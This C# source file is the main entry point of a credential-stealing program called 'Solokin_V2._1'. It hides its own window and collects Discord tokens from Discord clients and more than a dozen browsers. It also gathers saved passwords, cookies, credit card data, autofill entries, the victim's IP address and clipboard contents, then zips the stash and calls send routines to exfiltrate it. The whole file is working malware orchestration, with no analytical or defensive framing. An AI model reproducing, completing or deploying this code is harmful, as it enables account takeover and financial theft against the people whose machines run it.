using Newtonsoft.Json;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Solokin_V2._1
{
    static class Program
    {
        public static readonly string AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        public static string TokensString = "";
        public static string CreditCard = "";
        public static string Passwords = "";
        public static string AutoFill = "";
        public static string Cookies = "";
        public static string clipboardText = Clipboard.GetText();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        public static List<string> goSendTokens = DiscordStealing.AllTokens;

       

        /// <summary>
        /// Der Haupteinstiegspunkt für die Anwendung.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Ip.Get();
              

            Directory.CreateDirectory(AppData + "\\" + $"{Environment.UserDomainName}");
            Directory.CreateDirectory(AppData + "\\" + $"{Environment.UserDomainName}"+ "\\" + "System");
            Directory.CreateDirectory(AppData + "\\" + $"{ Environment.UserDomainName}" + "\\" + "Discord");
            Directory.CreateDirectory(AppData + "\\" + $"{Environment.UserDomainName}"+ "\\" + "Browsers");
         


          

            IntPtr hWnd = Process.GetCurrentProcess().MainWindowHandle;


            ShowWindow(hWnd, 0);



            // Dispose of the objects
            Discord.DiscordExistsOrNo();



            Task.WaitAll(
         DiscordStealing.DiscordApp(),
         DiscordStealing.DiscordCanary(),
         DiscordStealing.DiscordPTB(),
         DiscordStealing.Chrome(),
         DiscordStealing.ChromeBeta(),
         DiscordStealing.FireFox(),
         DiscordStealing.Opera(),
         DiscordStealing.OperaGX(),
         DiscordStealing.Edge(),
         DiscordStealing.Yandex(),
         DiscordStealing.Brave(),
         DiscordStealing.EpicPrivacy(),
         DiscordStealing.Vivaldi(),
         DiscordStealing.ThreeHundredSixty(),
         DiscordStealing.CocCoc()
         );



          


            BrowserUtils.ShowPasswords(Solokin_V2._1.Passwords.Get());
            BrowserUtils.ShowCookies(Solokin_V2._1.Cookies.Get());
            BrowserUtils.ShowCreditCards(CreditCards.Get());
            BrowserUtils.ShowAutoFill(Autofill.Get());



            string Tokens = string.Join(Environment.NewLine, goSendTokens.ToList());

            string path = AppData + "\\" + $"{ Environment.UserDomainName}" + "\\" + "System"+"\\"+"IP.txt";

            // Open the file for writing using StreamWriter
            using (StreamWriter writer = new StreamWriter(path,true))
            {
                // Write each string in the list to a new line in the file
              
                    writer.WriteLine(Ip.IP);
                
            }
            string Discordpath = AppData + "\\" + $"{Environment.UserDomainName}" + "\\" + "Discord"+"\\"+"Tokens.txt";

            // Open the file for writing using StreamWriter
            using (StreamWriter writer = new StreamWriter(Discordpath,true))
            {
                // Write each string in the list to a new line in the file

                writer.WriteLine(Tokens);

            }


            string path2 = AppData + "\\" + $"{ Environment.UserDomainName}" + "\\" + "System" + "\\" + "Clipboard.txt";

            // Open the file for writing using StreamWriter
            using (StreamWriter writer = new StreamWriter(path2, true))
            {
                // Write each string in the list to a new line in the file

                writer.WriteLine(clipboardText);

            }
            ZipFile.CreateFromDirectory(AppData + "\\" + $"{ Environment.UserDomainName}", AppData + "\\" + $"{Environment.UserDomainName}" + ".zip");
            Send.Send2();
            Thread.Sleep(400);
            Send.Send3();

        }

        
    }

}

